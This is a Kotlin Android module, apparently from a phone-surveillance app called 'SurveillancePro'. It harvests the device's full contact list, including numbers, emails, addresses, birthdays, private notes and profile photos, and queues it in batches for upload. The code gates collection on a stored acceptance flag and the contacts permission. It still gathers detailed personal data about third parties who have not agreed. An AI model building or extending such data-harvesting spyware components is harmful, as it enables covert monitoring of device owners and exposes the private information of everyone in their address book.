package com.surveillancepro.android.services

import android.Manifest
import android.content.ContentResolver
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.provider.ContactsContract
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Capture complète des contacts avec photos.
 * 
 * DONNÉES CAPTURÉES:
 * - Nom complet
 * - Tous les numéros de téléphone
 * - Tous les emails
 * - Photo de profil (compressée)
 * - Organisation/Entreprise
 * - Notes
 * - Date d'anniversaire
 * - Adresse
 * - Dernière modification
 * 
 * SANS ROOT - Utilise ContentResolver standard
 */
object ContactsCapture {
    
    private const val TAG = "ContactsCapture"
    private const val PHOTO_QUALITY = 50
    private const val MAX_PHOTO_SIZE = 100 // 100x100 pixels
    
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
    
    /**
     * Capture tous les contacts avec leurs détails complets.
     */
    fun captureAllContacts(context: Context) {
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted) return
        
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) 
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "READ_CONTACTS permission not granted")
            return
        }
        
        val queue = EventQueue.getInstance(context)
        val contacts = mutableListOf<Map<String, Any?>>()
        
        val resolver = context.contentResolver
        val cursor = resolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null,
            null,
            null,
            ContactsContract.Contacts.DISPLAY_NAME_PRIMARY + " ASC"
        )
        
        cursor?.use {
            val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
            val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY)
            val hasPhoneIndex = it.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)
            val photoUriIndex = it.getColumnIndex(ContactsContract.Contacts.PHOTO_URI)
            val lastUpdatedIndex = it.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP)
            
            while (it.moveToNext()) {
                try {
                    val contactId = it.getString(idIndex)
                    val name = it.getString(nameIndex) ?: continue
                    val hasPhone = it.getInt(hasPhoneIndex) > 0
                    val photoUri = if (photoUriIndex >= 0) it.getString(photoUriIndex) else null
                    val lastUpdated = if (lastUpdatedIndex >= 0) it.getLong(lastUpdatedIndex) else 0L
                    
                    // Récupérer les détails
                    val phones = if (hasPhone) getPhoneNumbers(resolver, contactId) else emptyList()
                    val emails = getEmails(resolver, contactId)
                    val organization = getOrganization(resolver, contactId)
                    val address = getAddress(resolver, contactId)
                    val birthday = getBirthday(resolver, contactId)
                    val notes = getNotes(resolver, contactId)
                    
                    // Récupérer la photo (compressée)
                    val photoBase64 = if (photoUri != null) {
                        getContactPhoto(context, Uri.parse(photoUri))
                    } else null
                    
                    contacts.add(mapOf(
                        "id" to contactId,
                        "name" to name,
                        "phones" to phones,
                        "emails" to emails,
                        "organization" to organization,
                        "address" to address,
                        "birthday" to birthday,
                        "notes" to notes,
                        "photoBase64" to photoBase64,
                        "lastUpdated" to if (lastUpdated > 0) dateFormat.format(Date(lastUpdated)) else null,
                    ))
                    
                } catch (e: Exception) {
                    Log.w(TAG, "Error reading contact: ${e.message}")
                }
            }
        }
        
        // Envoyer par lots de 50 contacts
        val batches = contacts.chunked(50)
        for ((index, batch) in batches.withIndex()) {
            queue.enqueue("contacts_full", mapOf(
                "contacts" to batch,
                "count" to batch.size,
                "batchIndex" to index,
                "totalBatches" to batches.size,
                "totalContacts" to contacts.size,
                "timestamp" to dateFormat.format(Date()),
            ))
        }
        
        Log.d(TAG, "Captured ${contacts.size} contacts in ${batches.size} batches")
    }
    
    /**
     * Récupère les numéros de téléphone d'un contact.
     */
    private fun getPhoneNumbers(resolver: ContentResolver, contactId: String): List<Map<String, String>> {
        val phones = mutableListOf<Map<String, String>>()
        
        val cursor = resolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
            arrayOf(contactId),
            null
        )
        
        cursor?.use {
            val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            val typeIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)
            
            while (it.moveToNext()) {
                val number = it.getString(numberIndex) ?: continue
                val type = it.getInt(typeIndex)
                val typeLabel = when (type) {
                    ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "mobile"
                    ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "home"
                    ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "work"
                    else -> "other"
                }
                phones.add(mapOf("number" to number, "type" to typeLabel))
            }
        }
        
        return phones
    }
    
    /**
     * Récupère les emails d'un contact.
     */
    private fun getEmails(resolver: ContentResolver, contactId: String): List<Map<String, String>> {
        val emails = mutableListOf<Map<String, String>>()
        
        val cursor = resolver.query(
            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
            null,
            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
            arrayOf(contactId),
            null
        )
        
        cursor?.use {
            val emailIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
            val typeIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE)
            
            while (it.moveToNext()) {
                val email = it.getString(emailIndex) ?: continue
                val type = it.getInt(typeIndex)
                val typeLabel = when (type) {
                    ContactsContract.CommonDataKinds.Email.TYPE_HOME -> "personal"
                    ContactsContract.CommonDataKinds.Email.TYPE_WORK -> "work"
                    else -> "other"
                }
                emails.add(mapOf("email" to email, "type" to typeLabel))
            }
        }
        
        return emails
    }
    
    /**
     * Récupère l'organisation d'un contact.
     */
    private fun getOrganization(resolver: ContentResolver, contactId: String): Map<String, String?>? {
        val cursor = resolver.query(
            ContactsContract.Data.CONTENT_URI,
            null,
            "${ContactsContract.Data.CONTACT_ID} = ? AND ${ContactsContract.Data.MIMETYPE} = ?",
            arrayOf(contactId, ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE),
            null
        )
        
        cursor?.use {
            if (it.moveToFirst()) {
                val companyIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Organization.COMPANY)
                val titleIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE)
                
                val company = if (companyIndex >= 0) it.getString(companyIndex) else null
                val title = if (titleIndex >= 0) it.getString(titleIndex) else null
                
                if (company != null || title != null) {
                    return mapOf("company" to company, "title" to title)
                }
            }
        }
        
        return null
    }
    
    /**
     * Récupère l'adresse d'un contact.
     */
    private fun getAddress(resolver: ContentResolver, contactId: String): String? {
        val cursor = resolver.query(
            ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI,
            null,
            ContactsContract.CommonDataKinds.StructuredPostal.CONTACT_ID + " = ?",
            arrayOf(contactId),
            null
        )
        
        cursor?.use {
            if (it.moveToFirst()) {
                val addressIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.FORMATTED_ADDRESS)
                if (addressIndex >= 0) {
                    return it.getString(addressIndex)
                }
            }
        }
        
        return null
    }
    
    /**
     * Récupère la date d'anniversaire d'un contact.
     */
    private fun getBirthday(resolver: ContentResolver, contactId: String): String? {
        val cursor = resolver.query(
            ContactsContract.Data.CONTENT_URI,
            null,
            "${ContactsContract.Data.CONTACT_ID} = ? AND ${ContactsContract.Data.MIMETYPE} = ? AND ${ContactsContract.CommonDataKinds.Event.TYPE} = ?",
            arrayOf(contactId, ContactsContract.CommonDataKinds.Event.CONTENT_ITEM_TYPE, 
                    ContactsContract.CommonDataKinds.Event.TYPE_BIRTHDAY.toString()),
            null
        )
        
        cursor?.use {
            if (it.moveToFirst()) {
                val dateIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Event.START_DATE)
                if (dateIndex >= 0) {
                    return it.getString(dateIndex)
                }
            }
        }
        
        return null
    }
    
    /**
     * Récupère les notes d'un contact.
     */
    private fun getNotes(resolver: ContentResolver, contactId: String): String? {
        val cursor = resolver.query(
            ContactsContract.Data.CONTENT_URI,
            null,
            "${ContactsContract.Data.CONTACT_ID} = ? AND ${ContactsContract.Data.MIMETYPE} = ?",
            arrayOf(contactId, ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE),
            null
        )
        
        cursor?.use {
            if (it.moveToFirst()) {
                val noteIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE)
                if (noteIndex >= 0) {
                    return it.getString(noteIndex)
                }
            }
        }
        
        return null
    }
    
    /**
     * Récupère et compresse la photo d'un contact.
     */
    private fun getContactPhoto(context: Context, photoUri: Uri): String? {
        return try {
            val inputStream: InputStream? = context.contentResolver.openInputStream(photoUri)
            inputStream?.use { stream ->
                val bitmap = BitmapFactory.decodeStream(stream) ?: return null
                
                // Redimensionner
                val scaledBitmap = Bitmap.createScaledBitmap(
                    bitmap,
                    MAX_PHOTO_SIZE,
                    MAX_PHOTO_SIZE,
                    true
                )
                
                // Compresser en JPEG
                val outputStream = ByteArrayOutputStream()
                scaledBitmap.compress(Bitmap.CompressFormat.JPEG, PHOTO_QUALITY, outputStream)
                
                if (scaledBitmap != bitmap) {
                    scaledBitmap.recycle()
                }
                bitmap.recycle()
                
                Base64.encodeToString(outputStream.toByteArray(), Base64.NO_WRAP)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error getting contact photo: ${e.message}")
            null
        }
    }
    
    /**
     * Capture uniquement les contacts modifiés depuis la dernière sync.
     */
    fun captureModifiedContacts(context: Context, sinceTimestamp: Long) {
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted) return
        
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) 
            != PackageManager.PERMISSION_GRANTED) {
            return
        }
        
        val queue = EventQueue.getInstance(context)
        val resolver = context.contentResolver
        
        val cursor = resolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null,
            "${ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP} > ?",
            arrayOf(sinceTimestamp.toString()),
            null
        )
        
        val modifiedCount = cursor?.count ?: 0
        cursor?.close()
        
        if (modifiedCount > 0) {
            Log.d(TAG, "$modifiedCount contacts modified since last sync")
            captureAllContacts(context) // Pour simplifier, on recapture tout
        }
    }
}
